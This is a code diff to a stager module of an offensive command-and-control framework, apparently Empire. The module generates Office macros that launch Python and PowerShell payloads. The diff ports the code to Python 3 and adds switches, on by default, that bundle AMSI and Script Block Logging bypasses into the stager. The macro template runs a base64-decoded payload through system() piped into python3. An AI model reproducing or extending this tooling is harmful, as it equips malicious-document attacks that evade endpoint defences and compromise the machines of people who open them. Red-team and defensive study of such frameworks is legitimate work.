@@ -1,7 +1,11 @@
+from __future__ import print_function
+from builtins import str
+from builtins import range
+from builtins import object
 from lib.common import helpers
 import re
 
-class Stager:
+class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -68,6 +72,21 @@ class Stager:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'ScriptLogBypass' : {
+                'Description'   :   'Include cobbr\'s Script Block Log Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'AMSIBypass' : {
+                'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'AMSIBypass2' : {
+                'Description'   :   'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'False'
             }
         }
 
@@ -88,7 +107,7 @@ class Stager:
             str1 = ''
             str2 = ''
             str1 = varstr + ' = "' + instr[:54] + '"'
-            for i in xrange(54, len(instr), 48):
+            for i in range(54, len(instr), 48):
                 holder.append('\t\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + "\""
@@ -104,12 +123,27 @@ class Stager:
         stagerRetries = self.options['StagerRetries']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         pixelTrackURL = self.options['PixelTrackURL']['Value']
+        scriptLogBypass = self.options['ScriptLogBypass']['Value']
+        AMSIBypass = self.options['AMSIBypass']['Value']
+        AMSIBypass2 = self.options['AMSIBypass2']['Value']
+
+        scriptLogBypassBool = False
+        if scriptLogBypass.lower() == "true":
+            scriptLogBypassBool = True
+
+        AMSIBypassBool = False
+        if AMSIBypass.lower() == "true":
+            AMSIBypassBool = True
+
+        AMSIBypass2Bool = False
+        if AMSIBypass2.lower() == "true":
+            AMSIBypass2Bool = True
 
         # generate the python launcher code
         pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
 
         if pylauncher == "":
-            print helpers.color("[!] Error in python launcher command generation.")
+            print(helpers.color("[!] Error in python launcher command generation."))
             return ""
 
         # render python launcher into python payload
@@ -118,16 +152,17 @@ class Stager:
             pypayload = formStr("str", match)
 
         # generate the powershell launcher code
-        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="powershell", encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="powershell", encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
 
         if poshlauncher == "":
-            print helpers.color("[!] Error in powershell launcher command generation.")
+            print(helpers.color("[!] Error in powershell launcher command generation."))
             return ""
 
         # render powershell launcher into powershell payload
         poshchunks = list(helpers.chunks(poshlauncher, 50))
         poshpayload = "Dim Str As String"
         poshpayload += "\n\t\tstr = \"" + str(poshchunks[0])
+
         for poshchunk in poshchunks[1:]:
             poshpayload += "\n\t\tstr = str + \"" + str(poshchunk)
 
@@ -169,8 +204,8 @@ Public Function Debugging() As Variant
                 Dim result As Long
                 Dim str As String
                 %s
-                'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | /usr/bin/python &")
-                result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | /usr/bin/python &")
+                'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
+                result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
             #Else
                 'Windows Rendering
                 Dim objWeb As Object
